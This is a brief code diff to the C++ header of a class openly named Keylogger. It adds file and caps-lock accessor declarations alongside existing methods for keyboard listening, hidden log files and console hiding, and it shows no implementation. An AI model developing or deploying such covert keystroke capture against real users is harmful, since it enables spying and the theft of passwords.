@@ -13,15 +13,20 @@ class Keylogger {
 		Keylogger();
 		Keylogger(string fileName);
 		int writeIntoFile(string words);
+		int clearFile();
 		void listenKeyboard();
 		int setHiddenFile();
 		bool isCapsLock();
 		int hideConsole();
 		int showConsole();
-
+		string getFile();
+		void setFile(string fileName);
+		void setCaps(bool b);
+		bool getCaps();
 
 	
 	private:
+		bool capsStart = false;
 		string filename;
 		int capsOn = 0;
 		int capsOff = 0;
